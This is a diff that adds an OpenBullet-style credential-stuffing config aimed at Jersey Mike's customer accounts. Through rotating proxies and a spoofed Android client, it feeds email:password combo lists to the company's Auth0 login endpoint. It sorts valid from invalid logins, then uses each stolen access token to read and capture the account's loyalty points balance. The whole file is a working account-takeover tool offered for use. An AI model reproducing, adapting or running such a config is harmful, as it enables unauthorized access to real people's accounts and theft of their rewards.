@@ -1,0 +1,78 @@
+[SETTINGS]
+{
+  "Name": "Jersey Mike's",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-04-08T18:47:07.0992913+02:00",
+  "AdditionalInfo": "Captures Points. Free goes to FREE.",
+  "Author": "ND03",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://login.jerseymikes.com/oauth/token" 
+  CONTENT "{\"password\":\"<PASS>\",\"scope\":\"openid profile email address phone offline_access\",\"client_id\":\"1E5huGRE00KtZArBbbfyXbDUvjpbRk6T\",\"username\":\"<USER>\",\"realm\":\"Username-Password-Authentication\",\"audience\":\"https://prd.bedrock.jerseymikes.com/api\",\"grant_type\":\"http://auth0.com/oauth/grant-type/password-realm\"}" 
+  CONTENTTYPE "application/json; charset=utf-8" 
+  HEADER "Auth0-Client: eyJuYW1lIjoiQXV0aDAuQW5kcm9pZCIsImVudiI6eyJhbmRyb2lkIjoiMjIifSwidmVyc2lvbiI6IjEuMTkuMSJ9" 
+  HEADER "User-Agent: okhttp/2.7.5" 
+
+#Login KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"access_token\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "{\"error\":\"invalid_grant\",\"error_description\":\"Wrong email or password.\"}" 
+
+#token PARSE "<SOURCE>" JSON "access_token" -> VAR "token" 
+
+#Points REQUEST GET "https://prd.bedrock.jerseymikes.com/api/v0/customers" 
+  
+  HEADER "AndroidVersion: 1396" 
+  HEADER "Authorization: Bearer <token>" 
+  HEADER "User-Agent: okhttp/4.2.2" 
+
+#Free KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\",\"pointsBalance\":0,\"" 
+
+#Points PARSE "<SOURCE>" JSON "pointsBalance" CreateEmpty=FALSE -> CAP "Points" 
+
